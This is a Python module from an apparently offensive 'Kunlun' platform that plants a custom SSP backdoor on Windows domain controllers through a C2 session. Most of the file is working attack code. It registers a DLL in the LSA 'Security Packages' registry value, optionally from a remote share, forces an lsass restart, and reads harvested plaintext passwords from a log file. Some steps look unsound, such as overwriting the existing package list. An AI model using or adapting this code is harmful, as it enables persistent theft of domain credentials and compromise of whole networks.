"""Custom SSP (Security Support Provider) backdoor module for Kunlun platform.

Provides:
- Custom SSP DLL registration on domain controllers
- Automatic plaintext password capture after registration
- Remote DLL hosting support (reduce local file footprint)
- Uninstall support (clear SSP registration and delete DLL)
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class SSPStatus(Enum):
    """Custom SSP status."""
    NOT_INSTALLED = "not_installed"
    INSTALLED = "installed"
    UNINSTALLING = "uninstalling"
    FAILED = "failed"


@dataclass
class SSPConfig:
    """Configuration for custom SSP backdoor.

    Attributes:
        target_dc: Target domain controller
        dll_path: Path to custom SSP DLL (local or UNC share)
        dll_name: SSP DLL name (without extension)
        use_remote_share: Whether DLL is on remote share
        remote_share_path: UNC path to remote share
        auto_verify: Auto verify after installation
        stealth_mode: Enable stealth mode
    """
    target_dc: str = ""
    dll_path: str = ""
    dll_name: str = "customssp"
    use_remote_share: bool = False
    remote_share_path: str = ""
    auto_verify: bool = True
    stealth_mode: bool = False


@dataclass
class SSPResult:
    """Result of custom SSP operation.

    Attributes:
        success: Whether operation succeeded
        status: Current SSP status
        dll_registered: Whether DLL was registered
        registry_modified: Whether registry was modified
        captured_credentials: List of captured credentials
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
        target_dc: Target domain controller
    """
    success: bool = False
    status: SSPStatus = SSPStatus.NOT_INSTALLED
    dll_registered: bool = False
    registry_modified: bool = False
    verification_passed: bool = False
    captured_credentials: List[Dict[str, str]] = field(default_factory=list)
    error_message: str = ""
    attck_technique: str = "T1556"
    duration_seconds: float = 0.0
    target_dc: str = ""


class SSPBackdoor:
    """Custom SSP backdoor module.

    Provides custom SSP DLL registration, plaintext password capture,
    and uninstall support for persistent credential harvesting.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize custom SSP backdoor module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._original_ssps: List[str] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("SSP Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("SSP: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def check_prerequisites(self, target_dc: str = "") -> Tuple[bool, List[str]]:
        """Check prerequisites for custom SSP backdoor.

        Args:
            target_dc: Target domain controller.

        Returns:
            Tuple of (can_install, issues).
        """
        issues: List[str] = []

        try:
            await self._report_log("检测SSP后门前置条件...")

            system_result = await self._execute_command("whoami /priv")
            if not system_result.get("success"):
                issues.append("无法执行系统命令")
                return False, issues

            output = str(system_result.get("output", ""))
            if "SeDebugPrivilege" not in output:
                issues.append("缺少SeDebugPrivilege权限（需要SYSTEM）")

            dc_check = await self._execute_command(
                "Get-WindowsFeature -Name AD-Domain-Services | Select-Object -ExpandProperty Installed"
            )
            if dc_check.get("success"):
                installed = str(dc_check.get("output", "")).strip().lower()
                if installed != "true":
                    issues.append("目标不是域控制器")

            return len(issues) == 0, issues

        except Exception as e:
            issues.append(f"前置检测异常: {e}")
            return False, issues

    async def install_ssp_backdoor(self, config: SSPConfig) -> SSPResult:
        """Install custom SSP backdoor.

        Args:
            config: SSP configuration.

        Returns:
            SSPResult with installation status.
        """
        start_time = time.time()
        result = SSPResult(target_dc=config.target_dc)

        try:
            await self._report_progress("检测前置条件", 5)

            can_install, issues = await self.check_prerequisites(config.target_dc)
            if not can_install:
                result.error_message = f"前置条件不满足: {', '.join(issues)}"
                result.status = SSPStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            await self._report_progress("备份原始SSP配置", 15)
            await self._report_log("备份原始SSP注册表配置...")

            backup_result = await self._backup_original_ssps()
            if backup_result.get("success"):
                self._original_ssps = backup_result.get("ssps", [])
                await self._report_log(f"原始SSP列表: {', '.join(self._original_ssps)}")
            else:
                await self._report_log("警告: 无法备份原始SSP配置")

            await self._report_progress("注册SSP DLL", 30)
            await self._report_log(f"开始注册SSP DLL: {config.dll_name}")

            if config.use_remote_share and config.remote_share_path:
                await self._report_log(f"使用远程共享路径: {config.remote_share_path}")
                dll_full_path = f"{config.remote_share_path}\\{config.dll_name}.dll"
            else:
                dll_full_path = config.dll_path if config.dll_path else f"C:\\Windows\\System32\\{config.dll_name}.dll"

            reg_cmd = (
                f"New-ItemProperty "
                f"\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" "
                f"-Name \"Security Packages\" "
                f"-Value \"{config.dll_name}\" "
                f"-PropertyType MultiString -Force"
            )
            reg_result = await self._execute_command(reg_cmd, config.target_dc)

            if not reg_result.get("success"):
                result.error_message = "SSP注册失败"
                result.status = SSPStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            result.registry_modified = True
            result.dll_registered = True
            await self._report_log("SSP DLL注册成功")

            await self._report_progress("触发SSP加载", 50)
            await self._report_log("触发SSP加载（通过lsass重启或用户登录）...")

            trigger_result = await self._trigger_ssp_load(config.target_dc)
            if trigger_result.get("success"):
                await self._report_log("SSP加载触发成功")
            else:
                await self._report_log("警告: SSP加载触发可能失败，需等待下次用户登录")

            result.status = SSPStatus.INSTALLED
            result.success = True

            if config.auto_verify:
                await self._report_progress("验证SSP后门", 70)
                verified = await self._verify_ssp(config.target_dc, config.dll_name)
                if verified:
                    await self._report_log("验证成功: SSP后门可用")
                    result.verification_passed = True
                else:
                    await self._report_log("警告: 验证失败，SSP后门可能不可用")

            await self._report_progress("检查凭据捕获", 85)
            captured = await self._check_captured_credentials(config.target_dc)
            result.captured_credentials = captured
            if captured:
                await self._report_log(f"已捕获 {len(captured)} 个凭据")

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)
            await self._report_log("SSP后门安装成功!")

            await self._broadcast_event(result, config)

        except Exception as e:
            result.error_message = str(e)
            result.status = SSPStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"SSP后门安装失败: {e}")
            logger.error("SSP backdoor installation failed: %s", e)

        return result

    async def _backup_original_ssps(self) -> Dict[str, Any]:
        """Backup original SSP configuration.

        Returns:
            Backup result with original SSP list.
        """
        try:
            cmd = (
                "Get-ItemProperty "
                "\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" "
                "-Name \"Security Packages\" | "
                "Select-Object -ExpandProperty \"Security Packages\""
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                ssps = [line.strip() for line in output.split("\n") if line.strip()]
                return {"success": True, "ssps": ssps}
            return {"success": False, "ssps": []}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _trigger_ssp_load(self, target_dc: str) -> Dict[str, Any]:
        """Trigger SSP DLL loading.

        Args:
            target_dc: Target domain controller.

        Returns:
            Trigger result.
        """
        try:
            cmd = "Restart-Service -Name lsass -Force"
            result = await self._execute_command(cmd, target_dc)
            return {"success": result.get("success", False)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _verify_ssp(self, target_dc: str, dll_name: str) -> bool:
        """Verify custom SSP backdoor.

        Args:
            target_dc: Target domain controller.
            dll_name: SSP DLL name.

        Returns:
            True if verification passed.
        """
        try:
            cmd = (
                "Get-ItemProperty "
                "\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" "
                "-Name \"Security Packages\" | "
                "Select-Object -ExpandProperty \"Security Packages\""
            )
            result = await self._execute_command(cmd, target_dc)
            if result.get("success"):
                output = str(result.get("output", ""))
                return dll_name in output
        except Exception as e:
            logger.error("SSP verification failed: %s", e)
        return False

    async def _check_captured_credentials(self, target_dc: str) -> List[Dict[str, str]]:
        """Check for captured credentials.

        Args:
            target_dc: Target domain controller.

        Returns:
            List of captured credentials.
        """
        credentials: List[Dict[str, str]] = []

        try:
            cmd = (
                "Get-Content \"C:\\Windows\\System32\\customssp.log\" "
                "-ErrorAction SilentlyContinue"
            )
            result = await self._execute_command(cmd, target_dc)
            if result.get("success"):
                output = str(result.get("output", ""))
                for line in output.split("\n"):
                    if ":" in line:
                        parts = line.split(":", 1)
                        if len(parts) == 2:
                            credentials.append({
                                "key": parts[0].strip(),
                                "value": parts[1].strip(),
                            })
        except Exception as e:
            logger.error("Failed to check captured credentials: %s", e)

        return credentials

    async def uninstall_ssp_backdoor(self, target_dc: str = "", dll_name: str = "customssp") -> bool:
        """Uninstall custom SSP backdoor.

        Args:
            target_dc: Target domain controller.
            dll_name: SSP DLL name.

        Returns:
            True if uninstall successful.
        """
        try:
            await self._report_log(f"开始卸载SSP后门: {target_dc}")

            await self._report_log("恢复原始SSP注册表配置...")
            if self._original_ssps:
                ssps_str = "\\n".join(self._original_ssps)
                restore_cmd = (
                    f"Set-ItemProperty "
                    f"\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" "
                    f"-Name \"Security Packages\" "
                    f"-Value @({ssps_str})"
                )
                result = await self._execute_command(restore_cmd, target_dc)
                if result.get("success"):
                    await self._report_log("SSP注册表配置恢复成功")
                else:
                    await self._report_log("警告: SSP注册表配置恢复失败")

            await self._report_log("删除SSP DLL文件...")
            delete_cmd = f"Remove-Item \"C:\\Windows\\System32\\{dll_name}.dll\" -Force -ErrorAction SilentlyContinue"
            result = await self._execute_command(delete_cmd, target_dc)
            if result.get("success"):
                await self._report_log("SSP DLL删除成功")
            else:
                await self._report_log("警告: SSP DLL删除失败")

            await self._report_log("SSP后门卸载完成")
            return True

        except Exception as e:
            logger.error("SSP backdoor uninstall failed: %s", e)
            return False

    async def _broadcast_event(self, result: SSPResult, config: SSPConfig) -> None:
        """Broadcast SSP backdoor event.

        Args:
            result: SSP result.
            config: SSP configuration.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "ssp_backdoor",
                "success": result.success,
                "target_dc": result.target_dc,
                "dll_registered": result.dll_registered,
                "captured_count": len(result.captured_credentials),
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast SSP event: %s", e)
